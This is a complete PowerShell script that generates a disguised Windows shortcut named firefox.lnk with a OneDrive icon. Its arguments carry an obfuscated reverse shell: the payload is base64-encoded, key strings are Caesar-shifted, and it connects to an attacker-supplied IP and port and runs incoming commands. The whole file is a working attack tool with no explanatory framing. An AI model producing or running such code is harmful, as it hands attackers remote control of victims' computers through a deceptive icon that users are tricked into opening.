param([string]$ip,[string]$port,[int]$offset=4)
$offset = 4

$rev_shell = @'
$x=(New-Object net.sockets.tcpclient("~",!)).getstream();[byte[]]$b=0..65535|%{0};while(($i=$x.read($b,0,$b.Length))-ne 0){$d=([system.text.encoding]::getencoding(20127)).getbytes(((iex((New-Object -t text.asciiencoding).getstring($b,0,$i))2>&1|out-string)+(pwd).path+"> "));$x.write($d,0,$d.Length);$x.flush()}
'@ -replace '~',$ip -replace '!',$port

$b64 = [convert]::ToBase64String([text.encoding]::ASCII.GetBytes($rev_shell))

$strings = @("assembly",'gettype','System.Text.Encoding','System.Convert','ascii','getstring','frombase64string',$b64)

#used to format after string obfuscation and fix formatting errors
$start = "([string]::new([char[]](('"
$end = "'"+'|fhx).Bytes|%{$johnxor-'+"$offset})))"
$fix = @'
'+"'"+'
'@

#caesar cipher tiem
function hide{
    param([string]$plaintext)
    (($plaintext-split''|%{[int][char]$_+$offset}|%{[char]$_})-join'' -replace '`','``' -replace "'",$fix) -replace "^",$start -replace '$',$end -replace 'johnxor','_'
}

$strings = $strings|%{hide($_)}

#decoded is [type].assembly.gettype('System.Convert')::frombase64string(SomeBase64)|i`ex
$final = ' [text.encoding]::ascii.getstring([type].'+$strings[0]+'.'+$strings[1]+'('+$strings[3]+')::'+$strings[6]+'('+$strings[7]+'))|i`ex'

#making the lnk
$WshShell = New-Object -comObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("C:\Users\"+$env:USERNAME+"\Desktop\firefox.lnk")
$Shortcut.RelativePath =  "powershell"
$Shortcut.IconLocation = "C:\Windows\SysWOW64\OneDrive.ico"
$Shortcut.TargetPath = "powershell"
$Shortcut.Arguments = ($final)
$Shortcut.Save()
